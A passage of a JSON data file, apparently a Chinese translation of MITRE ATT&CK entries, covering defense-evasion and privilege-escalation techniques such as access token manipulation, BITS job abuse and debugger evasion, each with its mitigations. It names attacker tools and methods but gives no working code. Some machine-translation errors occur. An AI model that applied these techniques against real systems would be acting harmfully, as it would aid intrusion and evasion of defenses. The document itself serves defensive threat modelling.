                    "type": "text",
                    "content": "本地、域和云帐户在系统网络上的权限重叠令人担忧，因为对手可能能够在帐户和系统之间切换，以达到高级别的访问（即域或企业管理员），从而绕过企业内设置的访问控制。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1036",
                "name": "帐户使用策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用条件访问策略阻止来自不兼容设备或来自定义的组织IP范围之外的登录。"
                        }
                    ]
                ]
            },
            {
                "id": "M1015",
                "name": "Active Directory配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "禁用不支持MFA的传统身份验证，并要求使用现代身份验证协议。"
                        }
                    ]
                ]
            },
            {
                "id": "M1013",
                "name": "应用程序开发人员指南",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保应用程序不会不安全地存储敏感数据或凭据。（例如，代码中的明文凭据、存储库中已发布的凭据或公共云存储中的凭据）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1027",
                "name": "密码策略",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用默认用户名和密码的应用程序和设备应在安装后以及部署到生产环境之前立即进行更改。在可能的情况下，应定期更新使用SSH密钥的应用程序，并确保其安全。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "策略应尽量减少（如果不能消除的话）不同用户帐户之间密码的重复使用，尤其是对可能不受企业安全资源保护的个人帐户使用相同凭据的员工。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期审核域和本地帐户及其权限级别，以寻找可能允许对手通过获取特权帐户的凭据获得广泛访问权限的情况。这些审计还应包括是否已启用默认帐户，或者是否创建了未经授权的新本地帐户。遵循企业网络设计和管理的最佳实践，以限制跨管理层的特权帐户使用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "定期审核用户帐户的活动，并停用或删除任何不再需要的帐户。"
                        }
                    ]
                ]
            },
            {
                "id": "M1017",
                "name": "用户培训",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "应用程序可以发送推送通知以验证作为多因素身份验证（MFA）形式的登录。培训用户只接受有效的推送通知并报告可疑的推送消息。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1548",
        "name": "Abuse Elevation Control Mechanism",
        "tactics": [
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            },
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1548.001",
                "name": "Setuid and Setgid"
            },
            {
                "id": "T1548.002",
                "name": "Bypass User Account Control"
            },
            {
                "id": "T1548.003",
                "name": "Sudo and Sudo Caching"
            },
            {
                "id": "T1548.004",
                "name": "Elevated Execution with Prompt"
            },
            {
                "id": "T1548.005",
                "name": "Temporary Elevated Cloud Access"
            }
        ],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会绕过旨在控制提升特权以获得更高级别权限的机制。大多数现代系统都包含本机高程控制机制，旨在限制用户可以在机器上执行的权限。必须向特定用户授予授权，以便执行可能被认为风险较高的任务。对手可以执行多种方法来利用内置的控制机制来提升系统的权限。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "检查Windows系统上常见的UAC旁路弱点，以了解风险状况并在适当的情况下解决问题。"
                        }
                    ]
                ]
            },
            {
                "id": "M1038",
                "name": "执行预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "系统设置可以阻止未从合法存储库下载的应用程序运行，这可能有助于缓解其中的一些问题。不允许未签名的应用程序运行也可以降低一些风险。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "具有已知漏洞或已知shell转义的应用程序不应设置setuid或setgid位，以减少应用程序受损时的潜在损坏。此外，在整个系统中，应尽量减少设置了setuid或setgid位的程序数量。确保启用sudo tty_tickets设置将防止这种跨tty会话的泄漏。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "从系统上的本地管理员组中删除用户。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "通过要求密码，即使对手可以获得终端访问权限，他们也必须知道密码才能运行sudoers文件中的任何内容。将timestamp_timeout设置为0将要求用户在每次执行sudo时输入密码。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "应该严格编辑sudoers文件，以便始终需要密码，并且用户不能作为具有更高权限的用户生成有风险的进程。"
                        }
                    ]
                ]
            },
            {
                "id": "M1052",
                "name": "用户帐户控制",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "尽管存在无人机绕过技术，但在可能的情况下，仍应谨慎地对无人机使用最高执行级别，并减少DLL搜索顺序劫持等技术存在的绕过机会。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将云帐户承担、创建或模拟其他角色、策略和权限的权限仅限于所需的权限。如果启用了即时访问，请考虑要求手动批准临时提升权限。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1134",
        "name": "Access Token Manipulation",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1134.001",
                "name": "Token Impersonation/Theft"
            },
            {
                "id": "T1134.002",
                "name": "Create Process with Token"
            },
            {
                "id": "T1134.003",
                "name": "Make and Impersonate Token"
            },
            {
                "id": "T1134.004",
                "name": "Parent PID Spoofing"
            },
            {
                "id": "T1134.005",
                "name": "SID-History Injection"
            }
        ],
        "version": "2.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以修改访问令牌以在不同的用户或系统安全上下文下操作，从而执行操作并绕过访问控制。Windows使用访问令牌来确定正在运行的进程的所有权。用户可以操纵访问令牌，使正在运行的进程看起来像是另一个进程的子进程，或者属于启动该进程的用户以外的其他人。当这种情况发生时，进程还将接受与新令牌相关联的安全上下文。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以使用内置的Windows API功能从现有进程中复制访问令牌；这就是所谓的代币盗窃。然后，这些令牌可以应用于现有进程（即令牌模拟/盗窃）或用于生成新进程（即使用令牌创建进程）。对手必须已经处于特权用户上下文（即管理员）中才能窃取令牌。然而，对手通常使用令牌窃取将其安全上下文从管理员级别提升到系统级别。如果帐户在远程系统上具有适当的权限，则对手可以使用令牌向远程系统进行身份验证，作为该令牌的帐户。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "任何标准用户都可以使用"
                },
                {
                    "type": "code",
                    "content": "runas"
                },
                {
                    "type": "text",
                    "content": "命令和Windows API函数来创建模拟令牌；它不需要访问管理员帐户。还有其他机制，如Active Directory字段，可用于修改访问令牌。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制权限，使用户和用户组无法创建令牌。应仅为本地系统帐户定义此设置。GPO:计算机配置>[策略]>Windows设置>安全设置>本地策略>用户权限分配：创建令牌对象。还定义谁可以通过GPO:计算机配置>[策略]>Windows设置>安全设置>本地策略>用户权限分配仅为本地和网络服务创建进程级令牌：替换进程级令牌。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "管理员应以标准用户身份登录，但使用内置的访问令牌操作命令"
                        },
                        {
                            "type": "code",
                            "content": "runas"
                        },
                        {
                            "type": "text",
                            "content": "以管理员权限运行其工具。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对手必须已经对本地系统具有管理员级别的访问权限，才能充分利用这项技术；请确保将用户和帐户限制为所需的最低权限。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1197",
        "name": "BITS Jobs",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0003",
                "name": "Persistence"
            }
        ],
        "subs": [],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用BITS作业来持续执行代码和执行各种后台任务。Windows后台智能传输服务（BITS）是一种通过组件对象模型（COM）公开的低带宽异步文件传输机制。BITS通常由更新程序、信使和其他应用程序使用，这些应用程序优选在后台操作（使用可用空闲带宽），而不会中断其他网络应用程序。文件传输任务被实现为BITS作业，BITS作业包含一个或多个文件操作的队列。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "可以通过PowerShell和BITSAdmin工具访问创建和管理BITS作业的接口。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会滥用BITS来下载（例如，Ingress Tool Transfer）、执行，甚至在运行恶意代码后进行清理（例如，指标删除）。BITS任务在BITS作业数据库中是自包含的，没有新文件或注册表修改，并且通常由主机防火墙允许。启用BITS的执行还可以通过创建长期作业（默认最长生存期为90天且可扩展）或在作业完成或出现错误时调用任意程序（包括系统重新启动后）来启用持久性。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "BITS上载功能也可用于通过替代协议执行Exfiltering。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "修改网络和/或主机防火墙规则以及其他网络控制，以仅允许合法的BITS流量。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "请考虑缩短组策略中的默认BITS作业生存期，或通过编辑"
                        },
                        {
                            "type": "code",
                            "content": "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\BITS"
                        },
                        {
                            "type": "text",
                            "content": "中的"
                        },
                        {
                            "type": "code",
                            "content": "JobInactivityTimeout"
                        },
                        {
                            "type": "text",
                            "content": "和"
                        },
                        {
                            "type": "code",
                            "content": "MaxDownloadTime"
                        },
                        {
                            "type": "text",
                            "content": "注册表值。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "请考虑将BITS接口的访问权限限制为特定用户或组。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1612",
        "name": "Build Image on Host",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以直接在主机上构建容器映像，以绕过监视从公共注册表检索恶意映像的防御。远程"
                },
                {
                    "type": "code",
                    "content": "构建"
                },
                {
                    "type": "text",
                    "content": "请求可以发送到Docker API，其中包括Dockerfile，该Dockerfile从公共或本地注册表中提取香草基础映像（如alpine），然后在此基础上构建自定义映像。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以利用"
                },
                {
                    "type": "code",
                    "content": "构建"
                },
                {
                    "type": "text",
                    "content": "API在主机上构建自定义镜像，其中包括从其C2服务器下载的恶意软件，然后他们可以使用该自定义镜像使用部署容器。如果基本映像是从公共注册表中提取的，防御系统可能不会检测到该映像是恶意的，因为它是普通映像。如果基本映像已经驻留在本地注册表中，则由于映像已经在环境中，因此可以认为拉取不那么可疑。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "审核环境中部署的映像，以确保它们不包含任何恶意组件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1035",
                "name": "限制通过网络访问资源",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将与容器服务的通信限制为本地Unix套接字或通过SSH进行远程访问。通过禁用对端口2375上Docker API的未经身份验证的访问，要求安全端口访问以通过TLS与API通信。相反，通过端口2376上的TLS与Docker API进行通信。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "拒绝通过使用网络代理、网关和防火墙直接远程访问内部系统。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保默认情况下容器未以root身份运行。在Kubernetes环境中，考虑定义Pod安全标准，以防止Pod运行特权容器。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1622",
        "name": "Debugger Evasion",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0007",
                "name": "Discovery"
            }
        ],
        "subs": [],
        "version": "1.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以使用各种手段来检测和避开调试器。调试器通常被防御者用来跟踪和/或分析潜在恶意软件有效负载的执行情况。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "调试器规避可以包括基于对指示调试环境的工件的存在的检查结果来改变行为。与虚拟化/沙盒规避类似，如果对手检测到调试器，他们可能会更改其恶意软件以脱离受害者或隐藏植入的核心功能。他们还可以在丢弃辅助或附加有效载荷之前搜索调试器工件。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "具体检查会因目标和/或对手而异，但可能涉及本机API函数调用，如"
                },
                {
                    "type": "code",
                    "content": "IsDebuggerPresent（）"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "NtQueryInformationProcess（）"
                },
                {
                    "type": "text",
                    "content": "，或手动检查流程环境块（PEB）的"
                },
                {
                    "type": "code",
                    "content": "BeingDebugge"
                },
                {
                    "type": "text",
                    "content": "标志。如果在当前进程中出现异常（假设当前调试器将“吞噬”或处理潜在错误），则对调试工件的其他检查也可能试图枚举硬件断点、中断程序集操作码、时间检查或测量。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "在自动发现过程中，对手可能会使用从这些调试器检查中学到的信息来塑造后续行为。还可以通过循环本机API函数调用（如"
                },
                {
                    "type": "code",
                    "content": "OutputDebugStringW（）"
                },
                {
                    "type": "text",
                    "content": "）生成的消息，分离进程或用无意义的数据淹没调试日志，从而避开调试器。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1140",
        "name": "Deobfuscate/Decode Files or Information",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会使用混淆的文件或信息来隐藏入侵的人工制品，使其无法进行分析。他们可能需要单独的机制来解码或解密这些信息，这取决于他们打算如何使用这些信息。这样做的方法包括恶意软件的内置功能或使用系统上的实用程序。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "一个这样的例子是使用certutil来解码隐藏在证书文件中的远程访问工具可移植可执行文件。另一个例子是使用Windows＜code＞copy/b＜/code＞命令将二进制片段重新组装到恶意负载中。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "有时，作为用户执行的一部分，可能需要用户的操作来打开它进行解密或解密。用户还可能被要求输入密码以打开由对手提供的受密码保护的压缩/加密文件。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1610",
        "name": "Deploy Container",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0002",
                "name": "Execution"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会将容器部署到环境中，以便于执行或躲避防御。在某些情况下，对手可能会部署新的容器来执行与特定映像或部署相关联的进程，例如执行或下载恶意软件的进程。在其他情况下，对手可以部署新的容器，该容器在没有网络规则、用户限制等的情况下配置，以绕过环境中的现有防御。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "容器可以通过各种方式进行部署，例如通过Docker的"
                },
                {
                    "type": "code",
                    "content": "create"
                },
                {
                    "type": "text",
                    "content": "和"
                },
                {
                    "type": "code",
                    "content": "start"
                },
                {
                    "type": "text",
                    "content": "API，或者通过web应用程序（如Kubernetes仪表板或Kubeflow）进行部署。敌人可以基于检索到的或构建的恶意映像或从运行时下载并执行恶意有效载荷的良性映像部署容器。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在部署之前扫描图像，并阻止那些不符合安全策略的图像。在Kubernetes环境中，准入控制器可以用于在容器部署请求经过身份验证之后但在部署容器之前验证映像。"
                        }
                    ]
                ]
            },
            {
                "id": "M1035",
                "name": "限制通过网络访问资源",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将与容器服务的通信限制在受管理和安全的通道上，例如本地Unix套接字或通过SSH进行远程访问。通过禁用对Docker API、Kubernetes API服务器和容器编排web应用程序的未经身份验证的访问，要求安全端口访问以通过TLS与API通信。在部署在云环境中的Kubernetes集群中，使用本地云平台功能来限制允许访问API服务器的IP范围。在可能的情况下，考虑启用对Kubernetes API的实时（JIT）访问，以对访问施加额外的限制。"
                        }
                    ]
                ]
            },
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "拒绝通过使用网络代理、网关和防火墙直接远程访问内部系统。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过将容器控制面板的访问权限限制为仅必要的用户，强制执行最小权限原则。使用Kubernetes时，请避免向用户授予通配符权限或将用户添加到"
                        },
                        {
                            "type": "code",
                            "content": "system:masters"
                        },
                        {
                            "type": "text",
                            "content": "组，并使用"
                        },
                        {
                            "type": "code",
                            "content": "RoleBindings"
                        },
                        {
                            "type": "text",
                            "content": "而不是<code>ClusterRoleBindings[/code>将用户权限限制在特定名称空间。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1006",
        "name": "Direct Volume Access",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [],
        "version": "2.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可以直接访问卷以绕过文件访问控制和文件系统监控。Windows允许程序直接访问逻辑卷。具有直接访问权限的程序可以通过分析文件系统数据结构直接从驱动器读取和写入文件。此技术可以绕过Windows文件访问控制以及文件系统监视工具。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "存在用于在PowerShell中执行这些操作的实用程序，如"
                },
                {
                    "type": "code",
                    "content": "NinjaCopy"
                },
                {
                    "type": "text",
                    "content": "。对手还可以使用内置或第三方实用程序（如"
                },
                {
                    "type": "code",
                    "content": "vssadmin"
                },
                {
                    "type": "text",
                    "content": "、"
                },
                {
                    "type": "code",
                    "content": "wbadmin"
                },
                {
                    "type": "text",
                    "content": "和esentutl）从系统卷创建数据的卷影副本或备份。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1040",
                "name": "端点上的行为预防",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "某些端点安全解决方案可以配置为阻止与对手创建备份的努力相关的某些类型的行为，例如命令执行或阻止对备份相关服务的API调用。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保只有配置和管理备份所需的帐户才有权限这样做。监视这些帐户是否存在未经授权的备份活动。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1484",
        "name": "Domain Policy Modification",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            }
        ],
        "subs": [
            {
                "id": "T1484.001",
                "name": "Group Policy Modification"
            },
            {
                "id": "T1484.002",
                "name": "Domain Trust Modification"
            }
        ],
        "version": "2.0",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会修改域的配置设置，以逃避防御和/或提升域环境中的权限。域提供了一种集中的方式来管理计算机资源（例如：计算机、用户帐户）在网络上的行为和相互交互。域的策略还包括可以在多域/林环境中的域之间应用的配置设置。对域设置的修改可能包括更改域组策略对象（GPO）或更改域的信任设置，包括联合信任。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "有了足够的权限，对手可以修改域策略设置。由于域配置设置控制着Active Directory（AD）环境中的许多交互，因此这种滥用可能会引发大量潜在的攻击。这种滥用的例子包括修改GPO以将恶意的计划任务推送到整个域环境中的计算机，或者修改域信任以包括对手控制的域，在该域中，他们可以控制随后将被受害者域资源接受的访问令牌。敌人还可以更改AD环境中的配置设置，以实现流氓域控制器。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可能会临时修改域策略，执行恶意操作，然后恢复更改以删除可疑指标。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1047",
                "name": "审计",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用审核工具，如BloodHound（1.5.1及更高版本），识别并纠正GPO权限滥用机会（例如：GPO修改权限）。"
                        }
                    ]
                ]
            },
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "使用最低权限并保护对域控制器和Active Directory联合身份验证服务（AD FS）服务器的管理访问。不要创建具有管理权限的服务帐户。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑实现WMI和安全筛选，以进一步定制GPO将应用于哪些用户和计算机。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1480",
        "name": "Execution Guardrails",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1480.001",
                "name": "Environmental Keying"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可以使用执行护栏，根据目标上预期存在的敌人提供的和特定环境的条件来限制执行或行动。护栏确保有效载荷只对预定目标执行，并减少对手战役的附带伤害。对手可以提供的关于目标系统或环境的值可以用作护栏，包括特定的网络共享名称、连接的物理设备、文件、加入的Active Directory（AD）域和本地/外部IP地址。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "护栏可用于防止能力暴露在不打算被破坏或在其中操作的环境中。这种护栏的使用不同于典型的虚拟化/沙盒规避。虽然虚拟化/沙盒规避的使用可能涉及检查已知的沙盒值，并仅在不匹配的情况下继续执行，但护栏的使用将涉及检查预期的目标特定值，并只有在匹配的情况下才继续执行。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1055",
                "name": "不缓解",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "执行警戒可能不应通过预防性控制来减轻，因为它可能会保护意外目标不受损害。如果有针对性，应集中精力防止敌方工具在活动链的早期运行，并在受到攻击时识别后续的恶意行为。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1211",
        "name": "Exploitation for Defense Evasion",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能利用系统或应用程序漏洞绕过安全功能。当对手利用程序、服务或操作系统软件或内核本身中的编程错误来执行对手控制的代码时，就会发生漏洞利用。防御性安全软件中可能存在漏洞，可用于禁用或规避这些漏洞。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能通过侦察事先知道环境中存在安全软件，或者他们可能在系统被破坏期间或之后不久执行检查以进行安全软件发现。安全软件很可能会直接成为攻击目标。有一些例子表明，反病毒软件被持续的威胁集团盯上，以避免被检测到。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "SaaS应用程序的公共云基础设施中也存在漏洞，这些漏洞可能绕过防御边界、躲避安全日志或部署隐藏的基础设施。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1048",
                "name": "应用程序隔离和沙盒",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过使用沙箱利用未发现或未修补的漏洞，使对手难以推进行动。其他类型的虚拟化和应用程序细分也可以减轻某些类型的利用带来的影响。这些系统中可能仍然存在其他漏洞和弱点的风险。"
                        }
                    ]
                ]
            },
            {
                "id": "M1050",
                "name": "利用漏洞保护",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "查找利用漏洞期间使用的行为的安全应用程序，如Windows Defender Exploit Guard（WDEG）和增强型缓解体验工具包（EMET），可用于缓解某些利用行为。控制流完整性检查是另一种可能识别和阻止软件利用的方法。其中许多保护依赖于体系结构和目标应用程序二进制文件的兼容性，可能不适用于以防御规避为目标的软件。"
                        }
                    ]
                ]
            },
            {
                "id": "M1019",
                "name": "威胁情报计划",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "开发强大的网络威胁情报能力，以确定哪些类型和级别的威胁可能使用软件攻击，以及针对特定组织的0天。"
                        }
                    ]
                ]
            },
            {
                "id": "M1051",
                "name": "更新软件",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "通过对内部企业端点和服务器使用补丁管理，定期更新软件。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1222",
        "name": "File and Directory Permissions Modification",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1222.001",
                "name": "Windows File and Directory Permissions Modification"
            },
            {
                "id": "T1222.002",
                "name": "Linux and Mac File and Directory Permissions Modification"
            }
        ],
        "version": "2.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会修改文件或目录权限/属性，以避开访问控制列表（ACL）和访问受保护的文件。文件和目录权限通常由文件或目录所有者或具有适当权限的用户配置的ACL管理。文件和目录ACL实现因平台而异，但通常明确指定哪些用户或组可以执行哪些操作（读取、写入、执行等）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "修改可能包括更改特定的访问权限，这可能需要获得文件或目录的所有权和/或根据文件或目录现有权限提升的权限。这可能会导致恶意活动，如修改、替换或删除特定的文件或目录。特定的文件和目录修改可能是许多技术所需的步骤，例如通过辅助功能、引导或登录初始化脚本、Unix外壳配置修改建立持久性，或通过劫持执行流污染/劫持其他工具二进制/配置文件。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人也可能更改符号链接的权限。例如，恶意软件（尤其是勒索软件）可能会修改符号链接和相关设置，以允许从具有远程路径的本地快捷方式访问文件。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1026",
                "name": "特权帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保关键系统文件以及已知被对手滥用的文件具有限制性权限，并由适当的特权帐户拥有，尤其是在用户不需要访问也不会抑制系统功能的情况下。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "对文件和目录应用更严格的权限可以防止对手修改其访问控制列表。此外，请确保正确设置或禁用有关本地和远程符号链接的用户设置（如不需要）。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1564",
        "name": "Hide Artifacts",
        "tactics": [
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1564.001",
                "name": "Hidden Files and Directories"
            },
            {
                "id": "T1564.002",
                "name": "Hidden Users"
            },
            {
                "id": "T1564.003",
                "name": "Hidden Window"
            },
            {
                "id": "T1564.004",
                "name": "NTFS File Attributes"
            },
            {
                "id": "T1564.005",
                "name": "Hidden File System"
            },
            {
                "id": "T1564.006",
                "name": "Run Virtual Instance"
            },
            {
                "id": "T1564.007",
                "name": "VBA Stomping"
            },
            {
                "id": "T1564.008",
                "name": "Email Hiding Rules"
            },
            {
                "id": "T1564.009",
                "name": "Resource Forking"
            },
            {
                "id": "T1564.010",
                "name": "Process Argument Spoofing"
            },
            {
                "id": "T1564.011",
                "name": "Ignore Process Interrupts"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能试图隐藏与其行为相关的伪影，以逃避检测。操作系统可能具有隐藏各种工件的功能，例如重要的系统文件和管理任务执行，以避免干扰用户工作环境并防止用户更改系统上的文件或功能。敌人可能会滥用这些功能来隐藏工件，如文件、目录、用户帐户或其他系统活动，以逃避检测。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手还可能试图通过创建与常见安全工具隔离的计算区域来隐藏与恶意行为相关联的工件，例如通过使用虚拟化技术。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1574",
        "name": "Hijack Execution Flow",
        "tactics": [
            {
                "id": "TA0003",
                "name": "Persistence"
            },
            {
                "id": "TA0004",
                "name": "Privilege Escalation"
            },
            {
                "id": "TA0005",
                "name": "Defense Evasion"
            }
        ],
        "subs": [
            {
                "id": "T1574.001",
                "name": "DLL Search Order Hijacking"
            },
            {
                "id": "T1574.002",
                "name": "DLL Side-Loading"
            },
            {
                "id": "T1574.004",
                "name": "Dylib Hijacking"
            },
            {
                "id": "T1574.005",
                "name": "Executable Installer File Permissions Weakness"
            },
            {
                "id": "T1574.006",
                "name": "Dynamic Linker Hijacking"
            },
            {
                "id": "T1574.007",
                "name": "Path Interception by PATH Environment Variable"
            },
            {
                "id": "T1574.008",
                "name": "Path Interception by Search Order Hijacking"
            },
            {
                "id": "T1574.009",
